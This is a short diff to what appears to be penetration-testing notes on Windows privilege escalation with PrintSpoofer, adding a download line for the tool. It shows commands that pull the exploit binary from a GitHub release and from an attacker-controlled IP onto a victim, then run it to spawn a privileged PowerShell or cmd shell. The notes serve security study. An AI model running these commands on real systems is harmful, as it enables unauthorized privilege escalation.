@@ -204,7 +204,7 @@ move .\BackendCacheCleanup.exe .\Pictures\
 ###### Named Pipes(PrintSpoofer)
 ```
 Requirements: SeImpersonatePrivilege has to be enabled
-
+Download address: wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
 kali: iwr -uri http://192.168.45.214/PrintSpoofer64.exe -Outfile PrintSpoofer64.exe
 victim: .\PrintSpoofer64.exe -i -c powershell.exe(cmd.exe)\
 
